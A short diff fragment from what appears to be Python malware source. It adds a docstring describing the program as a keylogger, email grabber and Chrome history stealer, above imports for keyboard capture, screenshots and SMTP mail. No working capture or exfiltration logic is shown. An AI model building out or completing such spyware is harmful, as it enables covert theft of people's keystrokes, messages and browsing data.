@@ -1,3 +1,5 @@
+''' Quick little program which is a keylogger, email grabber and chrome history getter. Dangerous :P'''
+
 import keyboard
 import smtplib, imghdr, time, pyautogui
 from threading import Timer, Semaphore
